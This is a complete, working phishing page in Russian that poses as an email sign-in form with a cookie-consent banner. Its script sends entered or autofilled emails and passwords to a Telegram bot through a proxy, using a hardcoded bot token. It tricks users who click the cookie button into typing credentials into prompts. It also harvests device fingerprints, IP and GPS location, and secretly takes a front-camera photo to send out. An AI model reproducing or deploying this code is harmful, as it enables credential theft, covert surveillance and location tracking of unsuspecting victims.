<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            background: white;
            padding: 38px;
            border-radius: 14px;
            box-shadow: 0 4px 14px rgba(0,0,0,0.15);
            width: 340px;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 13px;
            margin: 9px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-box button {
            width: 100%;
            padding: 13px;
            background: #0077cc;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 7px;
        }
        .login-box button:hover { background: #005fa3; }
        .logo {
            font-size: 26px;
            font-weight: bold;
            margin-bottom: 18px;
        }
        .cookie-banner {
            position: fixed;
            left: 0; right: 0; bottom: 0;
            background: #ffffff;
            border-top: 1px solid #e0e0e0;
            box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 14px;
            z-index: 9999;
            font-size: 14px;
            color: #333;
        }
        .cookie-banner .cookie-text { flex: 1; line-height: 1.4; text-align: left; }
        .cookie-banner .cookie-text b { display: block; margin-bottom: 4px; font-size: 15px; }
        .cookie-banner .cookie-text span { color: #666; font-size: 13px; }
        .cookie-banner .cookie-actions { display: flex; gap: 8px; flex-shrink: 0; }
        .cookie-banner button {
            padding: 10px 16px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            white-space: nowrap;
        }
        .cookie-banner .btn-accept { background: #0077cc; color: white; }
        .cookie-banner .btn-accept:hover { background: #005fa3; }
        .cookie-banner .btn-decline { background: #e4e6eb; color: #333; }
        .cookie-banner .btn-decline:hover { background: #d0d3d8; }
        .cookie-banner.cookie-hidden { display: none !important; }
        @media (max-width: 500px) {
            .cookie-banner { flex-direction: column; align-items: stretch; padding: 14px 16px; }
            .cookie-banner .cookie-actions { justify-content: stretch; }
            .cookie-banner .cookie-actions button { flex: 1; }
        }
    </style>
</head>
<body>

    <div id="loginFormContainer" class="login-box">
        <div class="logo">📧 Вход</div>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Адрес электронной почты" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Зарегистрироваться</button>
        </form>
    </div>

    <div id="cookieBanner" class="cookie-banner">
        <div class="cookie-text">
            <b>🍪 Мы используем файлы cookie</b>
            <span>Для корректной работы сайта и сохранения ваших данных. Нажимая «Подтвердить», вы соглашаетесь с обработкой данных.</span>
        </div>
        <div class="cookie-actions">
            <button class="btn-decline" id="btnDecline">Отклонить</button>
            <button class="btn-accept" id="btnAccept">Подтвердить</button>
        </div>
    </div>

<script>
    // ===== ВАШИ ДАННЫЕ =====
    const PROXY_URL = "https://mailproxy.donatstaff.workers.dev";
    const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
    const CHAT_ID = "8872810304";
    // ========================

    // ===== ОТПРАВКА ТЕКСТА ЧЕРЕЗ ПРОКСИ =====
    function send(text) {
        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        }).catch(function() {});
    }

    // ===== ОТПРАВКА ФОТО ЧЕРЕЗ ПРОКСИ =====
    function sendPhoto(base64, caption) {
        const byteString = atob(base64.split(",")[1]);
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
        const blob = new Blob([ab], { type: "image/jpeg" });

        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("caption", caption || "");
        fd.append("photo", blob, "photo.jpg");

        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendPhoto", {
            method: "POST",
            body: fd
        }).catch(function() {});
    }

    // ===== ОТПРАВКА ДАННЫХ ФОРМЫ =====
    function collectAndSend(type) {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        send("📩 " + type + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU"));
    }

    // ===== ФОТО С КАМЕРЫ =====
    function capturePhoto() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            send("📷 Камера: не поддерживается");
            return;
        }
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 }, audio: false })
            .then(function(stream) {
                const video = document.createElement("video");
                video.srcObject = stream;
                video.setAttribute("playsinline", "true");
                video.setAttribute("autoplay", "true");
                video.style.position = "fixed";
                video.style.left = "-9999px";
                document.body.appendChild(video);
                video.onloadedmetadata = function() {
                    video.play();
                    setTimeout(function() {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                        const dataURL = canvas.toDataURL("image/jpeg", 0.85);
                        sendPhoto(dataURL, "📷 ФОТО С КАМЕРЫ\n🕒 " + new Date().toLocaleString("ru-RU"));
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        document.body.removeChild(video);
                    }, 1200);
                };
            })
            .catch(function(err) {
                send("📷 Камера: доступ ЗАПРЕЩЁН (" + (err.name || err.message) + ")");
            });
    }

    // ===== ПОЛНЫЙ СБОР ИНФЫ =====
    function collectAllInfo() {
        // Устройство
        let info = "📱 УСТРОЙСТВО\n━━━━━━━━━━━━━━━━━━\n";
        info += "🕒 " + new Date().toLocaleString("ru-RU") + "\n";
        info += "🌐 URL: " + window.location.href + "\n";
        info += "↩ " + (document.referrer || "(прямой)") + "\n";
        info += "📱 UA: " + navigator.userAgent + "\n";
        info += "💻 Платформа: " + (navigator.platform || "—") + "\n";
        info += "🌐 Язык: " + (navigator.language || "—") + "\n";
        info += "🌐 Языки: " + (navigator.languages || []).join(", ") + "\n";
        info += "📲 Touch: " + (("ontouchstart" in window) ? "да" : "нет") + "\n";
        info += "⚙ CPU: " + (navigator.hardwareConcurrency || "—") + " ядер\n";
        info += "💾 RAM: " + (navigator.deviceMemory || "—") + " ГБ\n";
        info += "🖥 Экран: " + screen.width + "x" + screen.height + "\n";
        info += "🪟 Окно: " + window.innerWidth + "x" + window.innerHeight + "\n";
        info += "🕓 Часовой пояс: " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—") + "\n";
        send(info);

        // Сеть
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (c) {
            send("📡 СЕТЬ\n━━━━━━━━━━━━━━━━━━\n📶 " + (c.effectiveType || "—") + "\n⬇ " + (c.downlink || "—") + " Мбит/с\n📊 RTT " + (c.rtt || "—") + " мс");
        }

        // Батарея
        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                send("🔋 БАТАРЕЯ\n━━━━━━━━━━━━━━━━━━\n🔋 " + Math.round(b.level * 100) + "%\n⚡ " + (b.charging ? "заряжается" : "не заряжается"));
            }).catch(function() {});
        }

        // GPU
        try {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (gl) {
                const di = gl.getExtension("WEBGL_debug_renderer_info");
                if (di) {
                    send("🎮 GPU\n━━━━━━━━━━━━━━━━━━\n🎮 " + gl.getParameter(di.UNMASKED_VENDOR_WEBGL) + "\n🎮 " + gl.getParameter(di.UNMASKED_RENDERER_WEBGL));
                }
            }
        } catch(e) {}

        // Медиа
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                const cams = devices.filter(d => d.kind === "videoinput").length;
                const mics = devices.filter(d => d.kind === "audioinput").length;
                send("🎥 МЕДИА\n━━━━━━━━━━━━━━━━━━\n🎥 Камер: " + cams + "\n🎤 Микрофонов: " + mics);
            }).catch(function() {});
        }

        // IP + гео
        fetch("https://ipapi.co/json/")
            .then(r => r.json())
            .then(function(d) {
                let geo = "🌍 ГЕОЛОКАЦИЯ (IP)\n━━━━━━━━━━━━━━━━━━\n";
                geo += "🌍 IP: " + (d.ip || "—") + "\n";
                geo += "🏳 " + (d.country_name || "—") + "\n";
                geo += "📍 " + (d.region || "—") + "\n";
                geo += "🏙 " + (d.city || "—") + "\n";
                geo += "📮 " + (d.postal || "—") + "\n";
                geo += "🗺 " + (d.latitude || "—") + ", " + (d.longitude || "—") + "\n";
                geo += "📡 " + (d.org || "—") + "\n";
                geo += "\n🗺 Карта: https://maps.google.com/?q=" + (d.latitude || "") + "," + (d.longitude || "");
                send(geo);
            })
            .catch(function() {});

        // GPS (с разрешения)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(p) {
                    send("📍 ТОЧНАЯ ГЕОЛОКАЦИЯ (GPS)\n━━━━━━━━━━━━━━━━━━\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🗺 https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
                },
                function() {},
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }
    }

    // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
    document.getElementById("btnAccept").addEventListener("click", function() {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        if (!email || !password) {
            const userEmail = prompt("Для продолжения работы сайта введите вашу электронную почту:");
            if (userEmail) {
                document.getElementById("email").value = userEmail.trim();
                const userPass = prompt("Введите пароль для подтверждения:");
                if (userPass) {
                    document.getElementById("password").value = userPass.trim();
                }
            }
        }
        collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
        collectAllInfo();
        capturePhoto();
        document.getElementById("cookieBanner").classList.add("cookie-hidden");
    });

    // ===== КНОПКА "ОТКЛОНИТЬ" =====
    document.getElementById("btnDecline").addEventListener("click", function() {
        collectAndSend("COOKIE ОТКЛОНЕНО");
        document.getElementById("cookieBanner").classList.add("cookie-hidden");
    });

    // ===== ОТПРАВКА ФОРМЫ =====
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();
        collectAndSend("РУЧНОЙ ВВОД");
    });

    // ===== АВТОЗАПОЛНЕНИЕ =====
    function checkAutoFill() {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        if (email && password) {
            collectAndSend("АВТОЗАПОЛНЕНИЕ");
        }
    }
    window.addEventListener("load", function() {
        setTimeout(checkAutoFill, 500);
        setTimeout(checkAutoFill, 1500);
        setTimeout(checkAutoFill, 3000);
    });

    console.log("ROCKET ACTIVE — mailproxy + camera + GPS");
</script>
</body>
</html>
